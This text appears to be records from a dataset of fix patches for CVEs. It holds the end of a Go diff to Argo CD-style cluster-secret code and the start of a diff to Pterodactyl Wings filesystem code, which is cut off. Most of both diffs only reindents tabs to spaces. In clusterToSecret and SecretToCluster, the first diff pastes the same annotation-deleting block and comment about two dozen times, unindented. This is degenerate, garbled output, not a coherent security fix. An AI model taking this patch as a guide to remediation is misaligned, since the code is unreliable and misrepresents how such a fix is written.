deleted\n-\t\t\t\thandleModEvent(localCls, cluster)\n-\t\t\t\tlocalCls = cluster\n-\t\t\t\treturn\n-\t\t\t}\n-\t\t\thandleAddEvent(cluster)\n-\t\t},\n-\n-\t\tfunc(oldSecret *apiv1.Secret, newSecret *apiv1.Secret) {\n-\t\t\toldCluster, err := SecretToCluster(oldSecret)\n-\t\t\tif err != nil {\n-\t\t\t\tlog.Errorf(\"could not unmarshal cluster secret %s\", oldSecret.Name)\n-\t\t\t\treturn\n-\t\t\t}\n-\t\t\tnewCluster, err := SecretToCluster(newSecret)\n-\t\t\tif err != nil {\n-\t\t\t\tlog.Errorf(\"could not unmarshal cluster secret %s\", newSecret.Name)\n-\t\t\t\treturn\n-\t\t\t}\n-\t\t\tif newCluster.Server == appv1.KubernetesInternalAPIServerAddr {\n-\t\t\t\tlocalCls = newCluster\n-\t\t\t}\n-\t\t\thandleModEvent(oldCluster, newCluster)\n-\t\t},\n-\n-\t\tfunc(secret *apiv1.Secret) {\n-\t\t\tif string(secret.Data[\"server\"]) == appv1.KubernetesInternalAPIServerAddr {\n-\t\t\t\t// change local cluster event to modified or deleted, since it cannot be re-added or deleted\n-\t\t\t\thandleModEvent(localCls, db.getLocalCluster())\n-\t\t\t\tlocalCls = db.getLocalCluster()\n-\t\t\t} else {\n-\t\t\t\thandleDeleteEvent(string(secret.Data[\"server\"]))\n-\t\t\t}\n-\t\t},\n-\t)\n-\n-\treturn err\n+        handleAddEvent func(cluster *appv1.Cluster),\n+        handleModEvent func(oldCluster *appv1.Cluster, newCluster *appv1.Cluster),\n+        handleDeleteEvent func(clusterServer string)) error {\n+        localCls, err := db.GetCluster(ctx, appv1.KubernetesInternalAPIServerAddr)\n+        if err != nil {\n+                return err\n+        }\n+        handleAddEvent(localCls)\n+\n+        db.watchSecrets(\n+                ctx,\n+                common.LabelValueSecretTypeCluster,\n+\n+                func(secret *apiv1.Secret) {\n+                        cluster, err := SecretToCluster(secret)\n+                        if err != nil {\n+                                log.Errorf(\"could not unmarshal cluster secret %s\", secret.Name)\n+                                return\n+                        }\n+                        if cluster.Server == appv1.KubernetesInternalAPIServerAddr {\n+                                // change local cluster event to modified or deleted, since it cannot be re-added or deleted\n+                                handleModEvent(localCls, cluster)\n+                                localCls = cluster\n+                                return\n+                        }\n+                        handleAddEvent(cluster)\n+                },\n+\n+                func(oldSecret *apiv1.Secret, newSecret *apiv1.Secret) {\n+                        oldCluster, err := SecretToCluster(oldSecret)\n+                        if err != nil {\n+                                log.Errorf(\"could not unmarshal cluster secret %s\", oldSecret.Name)\n+                                return\n+                        }\n+                        newCluster, err := SecretToCluster(newSecret)\n+                        if err != nil {\n+                                log.Errorf(\"could not unmarshal cluster secret %s\", newSecret.Name)\n+                                return\n+                        }\n+                        if newCluster.Server == appv1.KubernetesInternalAPIServerAddr {\n+                                localCls = newCluster\n+                        }\n+                        handleModEvent(oldCluster, newCluster)\n+                },\n+\n+                func(secret *apiv1.Secret) {\n+                        if string(secret.Data[\"server\"]) == appv1.KubernetesInternalAPIServerAddr {\n+                                // change local cluster event to modified or deleted, since it cannot be re-added or deleted\n+                                handleModEvent(localCls, db.getLocalCluster())\n+                                localCls = db.getLocalCluster()\n+                        } else {\n+                                handleDeleteEvent(string(secret.Data[\"server\"]))\n+                        }\n+                },\n+        )\n+\n+        return err\n }\n \n func (db *db) getClusterSecret(server string) (*apiv1.Secret, error) {\n-\tclusterSecrets, err := db.listSecretsByType(common.LabelValueSecretTypeCluster)\n-\tif err != nil {\n-\t\treturn nil, err\n-\t}\n-\tsrv := strings.TrimRight(server, \"/\")\n-\tfor _, clusterSecret := range clusterSecrets {\n-\t\tif strings.TrimRight(string(clusterSecret.Data[\"server\"]), \"/\") == srv {\n-\t\t\treturn clusterSecret, nil\n-\t\t}\n-\t}\n-\treturn nil, status.Errorf(codes.NotFound, \"cluster %q not found\", server)\n+        clusterSecrets, err := db.listSecretsByType(common.LabelValueSecretTypeCluster)\n+        if err != nil {\n+                return nil, err\n+        }\n+        srv := strings.TrimRight(server, \"/\")\n+        for _, clusterSecret := range clusterSecrets {\n+                if strings.TrimRight(string(clusterSecret.Data[\"server\"]), \"/\") == srv {\n+                        return clusterSecret, nil\n+                }\n+        }\n+        return nil, status.Errorf(codes.NotFound, \"cluster %q not found\", server)\n }\n \n // GetCluster returns a cluster from a query\n func (db *db) GetCluster(_ context.Context, server string) (*appv1.Cluster, error) {\n-\tinformer, err := db.settingsMgr.GetSecretsInformer()\n-\tif err != nil {\n-\t\treturn nil, err\n-\t}\n-\tres, err := informer.GetIndexer().ByIndex(settings.ByClusterURLIndexer, server)\n-\tif err != nil {\n-\t\treturn nil, err\n-\t}\n-\tif len(res) > 0 {\n-\t\treturn SecretToCluster(res[0].(*apiv1.Secret))\n-\t}\n-\tif server == appv1.KubernetesInternalAPIServerAddr {\n-\t\treturn db.getLocalCluster(), nil\n-\t}\n-\n-\treturn nil, status.Errorf(codes.NotFound, \"cluster %q not found\", server)\n+        informer, err := db.settingsMgr.GetSecretsInformer()\n+        if err != nil {\n+                return nil, err\n+        }\n+        res, err := informer.GetIndexer().ByIndex(settings.ByClusterURLIndexer, server)\n+        if err != nil {\n+                return nil, err\n+        }\n+        if len(res) > 0 {\n+                return SecretToCluster(res[0].(*apiv1.Secret))\n+        }\n+        if server == appv1.KubernetesInternalAPIServerAddr {\n+                return db.getLocalCluster(), nil\n+        }\n+\n+        return nil, status.Errorf(codes.NotFound, \"cluster %q not found\", server)\n }\n \n // GetProjectClusters return project scoped clusters by given project name\n func (db *db) GetProjectClusters(ctx context.Context, project string) ([]*appv1.Cluster, error) {\n-\tinformer, err := db.settingsMgr.GetSecretsInformer()\n-\tif err != nil {\n-\t\treturn nil, fmt.Errorf(\"failed to get secrets informer: %w\", err)\n-\t}\n-\tsecrets, err := informer.GetIndexer().ByIndex(settings.ByProjectClusterIndexer, project)\n-\tif err != nil {\n-\t\treturn nil, fmt.Errorf(\"failed to get index by project cluster indexer for project %q: %w\", project, err)\n-\t}\n-\tvar res []*appv1.Cluster\n-\tfor i := range secrets {\n-\t\tcluster, err := SecretToCluster(secrets[i].(*apiv1.Secret))\n-\t\tif err != nil {\n-\t\t\treturn nil, fmt.Errorf(\"failed to convert secret to cluster: %w\", err)\n-\t\t}\n-\t\tres = append(res, cluster)\n-\t}\n-\treturn res, nil\n+        informer, err := db.settingsMgr.GetSecretsInformer()\n+        if err != nil {\n+                return nil, fmt.Errorf(\"failed to get secrets informer: %w\", err)\n+        }\n+        secrets, err := informer.GetIndexer().ByIndex(settings.ByProjectClusterIndexer, project)\n+        if err != nil {\n+                return nil, fmt.Errorf(\"failed to get index by project cluster indexer for project %q: %w\", project, err)\n+        }\n+        var res []*appv1.Cluster\n+        for i := range secrets {\n+                cluster, err := SecretToCluster(secrets[i].(*apiv1.Secret))\n+                if err != nil {\n+                        return nil, fmt.Errorf(\"failed to convert secret to cluster: %w\", err)\n+                }\n+                res = append(res, cluster)\n+        }\n+        return res, nil\n }\n \n func (db *db) GetClusterServersByName(ctx context.Context, name string) ([]string, error) {\n-\tinformer, err := db.settingsMgr.GetSecretsInformer()\n-\tif err != nil {\n-\t\treturn nil, err\n-\t}\n-\n-\t// if local cluster name is not overridden and specified name is local cluster name, return local cluster server\n-\tlocalClusterSecrets, err := informer.GetIndexer().ByIndex(settings.ByClusterURLIndexer, appv1.KubernetesInternalAPIServerAddr)\n-\tif err != nil {\n-\t\treturn nil, err\n-\t}\n-\n-\tif len(localClusterSecrets) == 0 && db.getLocalCluster().Name == name {\n-\t\treturn []string{appv1.KubernetesInternalAPIServerAddr}, nil\n-\t}\n-\n-\tsecrets, err := informer.GetIndexer().ByIndex(settings.ByClusterNameIndexer, name)\n-\tif err != nil {\n-\t\treturn nil, err\n-\t}\n-\tvar res []string\n-\tfor i := range secrets {\n-\t\ts := secrets[i].(*apiv1.Secret)\n-\t\tres = append(res, strings.TrimRight(string(s.Data[\"server\"]), \"/\"))\n-\t}\n-\treturn res, nil\n+        informer, err := db.settingsMgr.GetSecretsInformer()\n+        if err != nil {\n+                return nil, err\n+        }\n+\n+        // if local cluster name is not overridden and specified name is local cluster name, return local cluster server\n+        localClusterSecrets, err := informer.GetIndexer().ByIndex(settings.ByClusterURLIndexer, appv1.KubernetesInternalAPIServerAddr)\n+        if err != nil {\n+                return nil, err\n+        }\n+\n+        if len(localClusterSecrets) == 0 && db.getLocalCluster().Name == name {\n+                return []string{appv1.KubernetesInternalAPIServerAddr}, nil\n+        }\n+\n+        secrets, err := informer.GetIndexer().ByIndex(settings.ByClusterNameIndexer, name)\n+        if err != nil {\n+                return nil, err\n+        }\n+        var res []string\n+        for i := range secrets {\n+                s := secrets[i].(*apiv1.Secret)\n+                res = append(res, strings.TrimRight(string(s.Data[\"server\"]), \"/\"))\n+        }\n+        return res, nil\n }\n \n // UpdateCluster updates a cluster\n func (db *db) UpdateCluster(ctx context.Context, c *appv1.Cluster) (*appv1.Cluster, error) {\n-\tclusterSecret, err := db.getClusterSecret(c.Server)\n-\tif err != nil {\n-\t\tif status.Code(err) == codes.NotFound {\n-\t\t\treturn db.CreateCluster(ctx, c)\n-\t\t}\n-\t\treturn nil, err\n-\t}\n-\tif err := clusterToSecret(c, clusterSecret); err != nil {\n-\t\treturn nil, err\n-\t}\n-\n-\tclusterSecret, err = db.kubeclientset.CoreV1().Secrets(db.ns).Update(ctx, clusterSecret, metav1.UpdateOptions{})\n-\tif err != nil {\n-\t\treturn nil, err\n-\t}\n-\tcluster, err := SecretToCluster(clusterSecret)\n-\tif err != nil {\n-\t\tlog.Errorf(\"could not unmarshal cluster secret %s\", clusterSecret.Name)\n-\t\treturn nil, err\n-\t}\n-\treturn cluster, db.settingsMgr.ResyncInformers()\n+        clusterSecret, err := db.getClusterSecret(c.Server)\n+        if err != nil {\n+                if status.Code(err) == codes.NotFound {\n+                        return db.CreateCluster(ctx, c)\n+                }\n+                return nil, err\n+        }\n+        if err := clusterToSecret(c, clusterSecret); err != nil {\n+                return nil, err\n+        }\n+\n+        clusterSecret, err = db.kubeclientset.CoreV1().Secrets(db.ns).Update(ctx, clusterSecret, metav1.UpdateOptions{})\n+        if err != nil {\n+                return nil, err\n+        }\n+        cluster, err := SecretToCluster(clusterSecret)\n+        if err != nil {\n+                log.Errorf(\"could not unmarshal cluster secret %s\", clusterSecret.Name)\n+                return nil, err\n+        }\n+        return cluster, db.settingsMgr.ResyncInformers()\n }\n \n // DeleteCluster deletes a cluster by name\n func (db *db) DeleteCluster(ctx context.Context, server string) error {\n-\tsecret, err := db.getClusterSecret(server)\n-\tif err != nil {\n-\t\treturn err\n-\t}\n+        secret, err := db.getClusterSecret(server)\n+        if err != nil {\n+                return err\n+        }\n \n-\terr = db.deleteSecret(ctx, secret)\n-\tif err != nil {\n-\t\treturn err\n-\t}\n+        err = db.deleteSecret(ctx, secret)\n+        if err != nil {\n+                return err\n+        }\n \n-\treturn db.settingsMgr.ResyncInformers()\n+        return db.settingsMgr.ResyncInformers()\n }\n \n // clusterToData converts a cluster object to string data for serialization to a secret\n func clusterToSecret(c *appv1.Cluster, secret *apiv1.Secret) error {\n-\tdata := make(map[string][]byte)\n-\tdata[\"server\"] = []byte(strings.TrimRight(c.Server, \"/\"))\n-\tif c.Name == \"\" {\n-\t\tdata[\"name\"] = []byte(c.Server)\n-\t} else {\n-\t\tdata[\"name\"] = []byte(c.Name)\n-\t}\n-\tif len(c.Namespaces) != 0 {\n-\t\tdata[\"namespaces\"] = []byte(strings.Join(c.Namespaces, \",\"))\n-\t}\n-\tconfigBytes, err := json.Marshal(c.Config)\n-\tif err != nil {\n-\t\treturn err\n-\t}\n-\tdata[\"config\"] = configBytes\n-\tif c.Shard != nil {\n-\t\tdata[\"shard\"] = []byte(strconv.Itoa(int(*c.Shard)))\n-\t}\n-\tif c.ClusterResources {\n-\t\tdata[\"clusterResources\"] = []byte(\"true\")\n-\t}\n-\tif c.Project != \"\" {\n-\t\tdata[\"project\"] = []byte(c.Project)\n-\t}\n-\tsecret.Data = data\n-\n-\tsecret.Labels = c.Labels\n-\tsecret.Annotations = c.Annotations\n-\n-\tif secret.Annotations == nil {\n-\t\tsecret.Annotations = make(map[string]string)\n-\t}\n-\n-\tif c.RefreshRequestedAt != nil {\n-\t\tsecret.Annotations[appv1.AnnotationKeyRefresh] = c.RefreshRequestedAt.Format(time.RFC3339)\n-\t} else {\n-\t\tdelete(secret.Annotations, appv1.AnnotationKeyRefresh)\n-\t}\n-\taddSecretMetadata(secret, common.LabelValueSecretTypeCluster)\n-\treturn nil\n+        data := make(map[string][]byte)\n+        data[\"server\"] = []byte(strings.TrimRight(c.Server, \"/\"))\n+        if c.Name == \"\" {\n+                data[\"name\"] = []byte(c.Server)\n+        } else {\n+                data[\"name\"] = []byte(c.Name)\n+        }\n+        if len(c.Namespaces) != 0 {\n+                data[\"namespaces\"] = []byte(strings.Join(c.Namespaces, \",\"))\n+        }\n+        configBytes, err := json.Marshal(c.Config)\n+        if err != nil {\n+                return err\n+        }\n+        data[\"config\"] = configBytes\n+        if c.Shard != nil {\n+                data[\"shard\"] = []byte(strconv.Itoa(int(*c.Shard)))\n+        }\n+        if c.ClusterResources {\n+                data[\"clusterResources\"] = []byte(\"true\")\n+        }\n+        if c.Project != \"\" {\n+                data[\"project\"] = []byte(c.Project)\n+        }\n+        secret.Data = data\n+\n+        secret.Labels = c.Labels\n+        secret.Annotations = c.Annotations\n+if secret.Annotations != nil {\n+delete(secret.Annotations, apiv1.LastAppliedConfigAnnotation)\n+}\n+if secret.Annotations != nil {\n+delete(secret.Annotations, apiv1.LastAppliedConfigAnnotation)\n+}\n+\n+// Truncate the secret body from the last-applied-configuration annotation to avoid exposing sensitive information.\n+if secret.Annotations != nil {\n+delete(secret.Annotations, apiv1.LastAppliedConfigAnnotation)\n+}\n+\n+if secret.Annotations != nil {\n+// Truncate the secret body from the last-applied-configuration annotation to avoid exposing sensitive information.\n+delete(secret.Annotations, apiv1.LastAppliedConfigAnnotation)\n+}\n+if secret.Annotations != nil {\n+delete(secret.Annotations, apiv1.LastAppliedConfigAnnotation)\n+}\n+// Truncate the secret body from the last-applied-configuration annotation to avoid exposing sensitive information.\n+if secret.Annotations != nil {\n+delete(secret.Annotations, apiv1.LastAppliedConfigAnnotation)\n+}\n+if secret.Annotations != nil {\n+delete(secret.Annotations, apiv1.LastAppliedConfigAnnotation)\n+}\n+\n+// Truncate the secret body from the last-applied-configuration annotation to avoid exposing sensitive information.\n+if secret.Annotations != nil {\n+delete(secret.Annotations, apiv1.LastAppliedConfigAnnotation)\n+}\n+if secret.Annotations != nil {\n+delete(secret.Annotations, apiv1.LastAppliedConfigAnnotation)\n+}\n+if secret.Annotations != nil {\n+delete(secret.Annotations, apiv1.LastAppliedConfigAnnotation)\n+}\n+if secret.Annotations != nil {\n+delete(secret.Annotations, apiv1.LastAppliedConfigAnnotation)\n+}\n+\n+// Truncate the secret body from the last-applied-configuration annotation to avoid exposing sensitive information.\n+if secret.Annotations != nil {\n+delete(secret.Annotations, apiv1.LastAppliedConfigAnnotation)\n+}\n+// Truncate the secret body from the last-applied-configuration annotation to avoid exposing sensitive information.\n+if secret.Annotations != nil {\n+delete(secret.Annotations, apiv1.LastAppliedConfigAnnotation)\n+}\n+if secret.Annotations != nil {\n+delete(secret.Annotations, apiv1.LastAppliedConfigAnnotation)\n+}\n+// Truncate the secret body from the last-applied-configuration annotation to avoid exposing sensitive information.\n+if secret.Annotations != nil {\n+delete(secret.Annotations, apiv1.LastAppliedConfigAnnotation)\n+}\n+\n+// Truncate the secret body from the last-applied-configuration annotation to avoid exposing sensitive information.\n+if secret.Annotations != nil {\n+delete(secret.Annotations, apiv1.LastAppliedConfigAnnotation)\n+}\n+if secret.Annotations != nil {\n+delete(secret.Annotations, apiv1.LastAppliedConfigAnnotation)\n+}\n+// Truncate the secret body from the last-applied-configuration annotation to avoid exposing sensitive information.\n+if secret.Annotations != nil {\n+delete(secret.Annotations, apiv1.LastAppliedConfigAnnotation)\n+}\n+if secret.Annotations != nil {\n+delete(secret.Annotations, apiv1.LastAppliedConfigAnnotation)\n+}\n+\n+// Truncate the secret body from the last-applied-configuration annotation to avoid exposing sensitive information.\n+if secret.Annotations != nil {\n+delete(secret.Annotations, apiv1.LastAppliedConfigAnnotation)\n+}\n+if secret.Annotations != nil {\n+delete(secret.Annotations, apiv1.LastAppliedConfigAnnotation)\n+}\n+if secret.Annotations != nil {\n+delete(secret.Annotations, apiv1.LastAppliedConfigAnnotation)\n+}\n+if secret.Annotations != nil {\n+// Truncate the secret body from the last-applied-configuration annotation to avoid exposing sensitive information.\n+delete(secret.Annotations, apiv1.LastAppliedConfigAnnotation)\n+}\n+if secret.Annotations != nil {\n+delete(secret.Annotations, apiv1.LastAppliedConfigAnnotation)\n+}\n+\n+        if secret.Annotations == nil {\n+                secret.Annotations = make(map[string]string)\n+        }\n+\n+        // Truncate the secret body from the last-applied-configuration annotation to avoid exposing sensitive information.\n+if secret.Annotations != nil {\n+delete(secret.Annotations, apiv1.LastAppliedConfigAnnotation)\n+}\n+\n+if c.RefreshRequestedAt != nil {\n+                secret.Annotations[appv1.AnnotationKeyRefresh] = c.RefreshRequestedAt.Format(time.RFC3339)\n+        } else {\n+                delete(secret.Annotations, appv1.AnnotationKeyRefresh)\n+        }\n+        addSecretMetadata(secret, common.LabelValueSecretTypeCluster)\n+        return nil\n }\n \n // SecretToCluster converts a secret into a Cluster object\n func SecretToCluster(s *apiv1.Secret) (*appv1.Cluster, error) {\n-\tvar config appv1.ClusterConfig\n-\tif len(s.Data[\"config\"]) > 0 {\n-\t\terr := json.Unmarshal(s.Data[\"config\"], &config)\n-\t\tif err != nil {\n-\t\t\treturn nil, fmt.Errorf(\"failed to unmarshal cluster config: %w\", err)\n-\t\t}\n-\t}\n-\n-\tvar namespaces []string\n-\tfor _, ns := range strings.Split(string(s.Data[\"namespaces\"]), \",\") {\n-\t\tif ns = strings.TrimSpace(ns); ns != \"\" {\n-\t\t\tnamespaces = append(namespaces, ns)\n-\t\t}\n-\t}\n-\tvar refreshRequestedAt *metav1.Time\n-\tif v, found := s.Annotations[appv1.AnnotationKeyRefresh]; found {\n-\t\trequestedAt, err := time.Parse(time.RFC3339, v)\n-\t\tif err != nil {\n-\t\t\tlog.Warnf(\"Error while parsing date in cluster secret '%s': %v\", s.Name, err)\n-\t\t} else {\n-\t\t\trefreshRequestedAt = &metav1.Time{Time: requestedAt}\n-\t\t}\n-\t}\n-\tvar shard *int64\n-\tif shardStr := s.Data[\"shard\"]; shardStr != nil {\n-\t\tif val, err := strconv.Atoi(string(shardStr)); err != nil {\n-\t\t\tlog.Warnf(\"Error while parsing shard in cluster secret '%s': %v\", s.Name, err)\n-\t\t} else {\n-\t\t\tshard = pointer.Int64Ptr(int64(val))\n-\t\t}\n-\t}\n-\n-\t// copy labels and annotations excluding system ones\n-\tlabels := map[string]string{}\n-\tif s.Labels != nil {\n-\t\tlabels = collections.CopyStringMap(s.Labels)\n-\t\tdelete(labels, common.LabelKeySecretType)\n-\t}\n-\tannotations := map[string]string{}\n-\tif s.Annotations != nil {\n-\t\tannotations = collections.CopyStringMap(s.Annotations)\n-\t\tdelete(annotations, common.AnnotationKeyManagedBy)\n-\t}\n-\n-\tcluster := appv1.Cluster{\n-\t\tID:                 string(s.UID),\n-\t\tServer:             strings.TrimRight(string(s.Data[\"server\"]), \"/\"),\n-\t\tName:               string(s.Data[\"name\"]),\n-\t\tNamespaces:         namespaces,\n-\t\tClusterResources:   string(s.Data[\"clusterResources\"]) == \"true\",\n-\t\tConfig:             config,\n-\t\tRefreshRequestedAt: refreshRequestedAt,\n-\t\tShard:              shard,\n-\t\tProject:            string(s.Data[\"project\"]),\n-\t\tLabels:             labels,\n-\t\tAnnotations:        annotations,\n-\t}\n-\treturn &cluster, nil\n+        var config appv1.ClusterConfig\n+        if len(s.Data[\"config\"]) > 0 {\n+                err := json.Unmarshal(s.Data[\"config\"], &config)\n+                if err != nil {\n+                        return nil, fmt.Errorf(\"failed to unmarshal cluster config: %w\", err)\n+                }\n+        }\n+\n+        var namespaces []string\n+        for _, ns := range strings.Split(string(s.Data[\"namespaces\"]), \",\") {\n+                if ns = strings.TrimSpace(ns); ns != \"\" {\n+                        namespaces = append(namespaces, ns)\n+                }\n+        }\n+        var refreshRequestedAt *metav1.Time\n+        if v, found := s.Annotations[appv1.AnnotationKeyRefresh]; found {\n+                requestedAt, err := time.Parse(time.RFC3339, v)\n+                if err != nil {\n+                        log.Warnf(\"Error while parsing date in cluster secret '%s': %v\", s.Name, err)\n+                } else {\n+                        refreshRequestedAt = &metav1.Time{Time: requestedAt}\n+                }\n+        }\n+        var shard *int64\n+        if shardStr := s.Data[\"shard\"]; shardStr != nil {\n+                if val, err := strconv.Atoi(string(shardStr)); err != nil {\n+                        log.Warnf(\"Error while parsing shard in cluster secret '%s': %v\", s.Name, err)\n+                } else {\n+                        shard = pointer.Int64Ptr(int64(val))\n+                }\n+        }\n+\n+        // copy labels and annotations excluding system ones\n+        labels := map[string]string{}\n+        if s.Labels != nil {\n+                labels = collections.CopyStringMap(s.Labels)\n+                delete(labels, common.LabelKeySecretType)\n+        }\n+        annotations := map[string]string{}\n+        if s.Annotations != nil {\n+                annotations = collections.CopyStringMap(s.Annotations)\n+                delete(annotations, apiv1.LastAppliedConfigAnnotation)\n+delete(annotations, common.AnnotationKeyManagedBy)\n+delete(annotations, apiv1.LastAppliedConfigAnnotation)\n+delete(annotations, apiv1.LastAppliedConfigAnnotation)\n+        }\n+\n+        cluster := appv1.Cluster{\n+                ID:                 string(s.UID),\n+                Server:             strings.TrimRight(string(s.Data[\"server\"]), \"/\"),\n+                Name:               string(s.Data[\"name\"]),\n+                Namespaces:         namespaces,\n+                ClusterResources:   string(s.Data[\"clusterResources\"]) == \"true\",\n+                Config:             config,\n+                RefreshRequestedAt: refreshRequestedAt,\n+                Shard:              shard,\n+                Project:            string(s.Data[\"project\"]),\n+                Labels:             labels,\n+                Annotations:        annotations,\n+        }\n+        return &cluster, nil\n }\n"}
{"cve":"CVE-2023-25168:0708", "fix_patch": "diff --git a/server/filesystem/filesystem.go b/server/filesystem/filesystem.go\nindex 1d906f0..7097be2 100644\n--- a/server/filesystem/filesystem.go\n+++ b/server/filesystem/filesystem.go\n@@ -1,217 +1,217 @@\n package filesystem\n \n import (\n-\t\"bufio\"\n-\t\"io\"\n-\t\"io/ioutil\"\n-\t\"os\"\n-\t\"path\"\n-\t\"path/filepath\"\n-\t\"sort\"\n-\t\"strconv\"\n-\t\"strings\"\n-\t\"sync\"\n-\t\"sync/atomic\"\n-\t\"time\"\n-\n-\t\"emperror.dev/errors\"\n-\t\"github.com/gabriel-vasile/mimetype\"\n-\t\"github.com/karrick/godirwalk\"\n-\tignore \"github.com/sabhiram/go-gitignore\"\n-\n-\t\"github.com/pterodactyl/wings/config\"\n-\t\"github.com/pterodactyl/wings/system\"\n+        \"bufio\"\n+        \"io\"\n+        \"io/ioutil\"\n+        \"os\"\n+        \"path\"\n+        \"path/filepath\"\n+        \"sort\"\n+        \"strconv\"\n+        \"strings\"\n+        \"sync\"\n+        \"sync/atomic\"\n+        \"time\"\n+\n+        \"emperror.dev/errors\"\n+        \"github.com/gabriel-vasile/mimetype\"\n+        \"github.com/karrick/godirwalk\"\n+        ignore \"github.com/sabhiram/go-gitignore\"\n+\n+        \"github.com/pterodactyl/wings/config\"\n+        \"github.com/pterodactyl/wings/system\"\n )\n \n type Filesystem struct {\n-\tmu                sync.RWMutex\n-\tlastLookupTime    *usageLookupTime\n-\tlookupInProgress  *system.AtomicBool\n-\tdiskUsed          int64\n-\tdiskCheckInterval time.Duration\n-\tdenylist          *ignore.GitIgnore\n+        mu                sync.RWMutex\n+        lastLookupTime    *usageLookupTime\n+        lookupInProgress  *system.AtomicBool\n+        diskUsed          int64\n+        diskCheckInterval time.Duration\n+        denylist          *ignore.GitIgnore\n \n-\t// The maximum amount of disk space (in bytes) that this Filesystem instance can use.\n-\tdiskLimit int64\n+        // The maximum amount of disk space (in bytes) that this Filesystem instance can use.\n+        diskLimit int64\n \n-\t// The root data directory path for this Filesystem instance.\n-\troot string\n+        // The root data directory path for this Filesystem instance.\n+        root string\n \n-\tisTest bool\n+        isTest bool\n }\n \n // New creates a new Filesystem instance for a given server.\n func New(root string, size int64, denylist []string) *Filesystem {\n-\treturn &Filesystem{\n-\t\troot:              root,\n-\t\tdiskLimit:         size,\n-\t\tdiskCheckInterval: time.Duration(config.Get().System.DiskCheckInterval),\n-\t\tlastLookupTime:    &usageLookupTime{},\n-\t\tlookupInProgress:  system.NewAtomicBool(false),\n-\t\tdenylist:          ignore.CompileIgnoreLines(denylist...),\n-\t}\n+        return &Filesystem{\n+                root:              root,\n+                diskLimit:         size,\n+                diskCheckInterval: time.Duration(config.Get().System.DiskCheckInterval),\n+                lastLookupTime:    &usageLookupTime{},\n+                lookupInProgress:  system.NewAtomicBool(false),\n+                denylist:          ignore.CompileIgnoreLines(denylist...),\n+        }\n }\n \n // Path returns the root path for the Filesystem instance.\n func (fs *Filesystem) Path() string {\n-\treturn fs.root\n+        return fs.root\n }\n \n // File returns a reader for a file instance as well as the stat information.\n func (fs *Filesystem) File(p string) (*os.File, Stat, error) {\n-\tcleaned, err := fs.SafePath(p)\n-\tif err != nil {\n-\t\treturn nil, Stat{}, errors.WithStackIf(err)\n-\t}\n-\tst, err := fs.Stat(cleaned)\n-\tif err != nil {\n-\t\tif errors.Is(err, os.ErrNotExist) {\n-\t\t\treturn nil, Stat{}, newFilesystemError(ErrNotExist, err)\n-\t\t}\n-\t\treturn nil, Stat{}, errors.WithStackIf(err)\n-\t}\n-\tif st.IsDir() {\n-\t\treturn nil, Stat{}, newFilesystemError(ErrCodeIsDirectory, nil)\n-\t}\n-\tf, err := os.Open(cleaned)\n-\tif err != nil {\n-\t\treturn nil, Stat{}, errors.WithStackIf(err)\n-\t}\n-\treturn f, st, nil\n+        cleaned, err := fs.SafePath(p)\n+        if err != nil {\n+                return nil, Stat{}, errors.WithStackIf(err)\n+        }\n+        st, err := fs.Stat(cleaned)\n+        if err != nil {\n+                if errors.Is(err, os.ErrNotExist) {\n+                        return nil, Stat{}, newFilesystemError(ErrNotExist, err)\n+                }\n+                return nil, Stat{}, errors.WithStackIf(err)\n+        }\n+        if st.IsDir() {\n+                return nil, Stat{}, newFilesystemError(ErrCodeIsDirectory, nil)\n+        }\n+        f, err := os.Open(cleaned)\n+        if err != nil {\n+                return nil, Stat{}, errors.WithStackIf(err)\n+        }\n+        return f, st, nil\n }\n \n // Touch acts by creating the given file and path on the disk if it is not present\n // already. If  it is present, the file is opened using the defaults which will truncate\n // the contents. The opened file is then returned to the caller.\n func (fs *Filesystem) Touch(p string, flag int) (*os.File, error) {\n-\tcleaned, err := fs.SafePath(p)\n-\tif err != nil {\n-\t\treturn nil, err\n-\t}\n-\tf, err := os.OpenFile(cleaned, flag, 0o644)\n-\tif err == nil {\n-\t\treturn f, nil\n-\t}\n-\tif f != nil {\n-\t\t_ = f.Close()\n-\t}\n-\t// If the error is not because it doesn't exist then we just need to bail at this point.\n-\tif !errors.Is(err, os.ErrNotExist) {\n-\t\treturn nil, errors.Wrap(err, \"server/filesystem: touch: failed to open file handle\")\n-\t}\n-\t// Only create and chown the directory if it doesn't exist.\n-\tif _, err := os.Stat(filepath.Dir(cleaned)); errors.Is(err, os.ErrNotExist) {\n-\t\t// Create the path leading up to the file we're trying to create, setting the final perms\n-\t\t// on it as we go.\n-\t\tif err := os.MkdirAll(filepath.Dir(cleaned), 0o755); err != nil {\n-\t\t\treturn nil, errors.Wrap(err, \"server/filesystem: touch: failed to create directory tree\")\n-\t\t}\n-\t\tif err := fs.Chown(filepath.Dir(cleaned)); err != nil {\n-\t\t\treturn nil, err\n-\t\t}\n-\t}\n-\to := &fileOpener{}\n-\t// Try to open the file now that we have created the pathing necessary for it, and then\n-\t// Chown that file so that the permissions don't mess with things.\n-\tf, err = o.open(cleaned, flag, 0o644)\n-\tif err != nil {\n-\t\treturn nil, errors.Wrap(err, \"server/filesystem: touch: failed to open file with wait\")\n-\t}\n-\t_ = fs.Chown(cleaned)\n-\treturn f, nil\n+        cleaned, err := fs.SafePath(p)\n+        if err != nil {\n+                return nil, err\n+        }\n+        f, err := os.OpenFile(cleaned, flag, 0o644)\n+        if err == nil {\n+                return f, nil\n+        }\n+        if f != nil {\n+                _ = f.Close()\n+        }\n+        // If the error is not because it doesn't exist then we just need to bail at this point.\n+        if !errors.Is(err, os.ErrNotExist) {\n+                return nil, errors.Wrap(err, \"server/filesystem: touch: failed to open file handle\")\n+        }\n+        // Only create and chown the directory if it doesn't exist.\n+        if _, err := os.Stat(filepath.Dir(cleaned)); errors.Is(err, os.ErrNotExist) {\n+                // Create the path leading up to the file we're trying to create, setting the final perms\n+                // on it as we go.\n+                if err := os.MkdirAll(filepath.Dir(cleaned), 0o755); err != nil {\n+                        return nil, errors.Wrap(err, \"server/filesystem: touch: failed to create directory tree\")\n+                }\n+                if err := fs.Chown(filepath.Dir(cleaned)); err != nil {\n+                        return nil, err\n+                }\n+        }\n+        o := &fileOpener{}\n+        // Try to open the file now that we have created the pathing necessary for it, and then\n+        // Chown that file so that the permissions don't mess with things.\n+        f, err = o.open(cleaned, flag, 0o644)\n+        if err != nil {\n+                return nil, errors.Wrap(err, \"server/filesystem: touch: failed to open file with wait\")\n+        }\n+        _ = fs.Chown(cleaned)\n+        return f, nil\n }\n \n // Writefile writes a file to the system. If the file does not already exist one\n // will be created. This will also properly recalculate the disk space used by\n // the server when writing new files or modifying existing ones.\n func (fs *Filesystem) Writefile(p string, 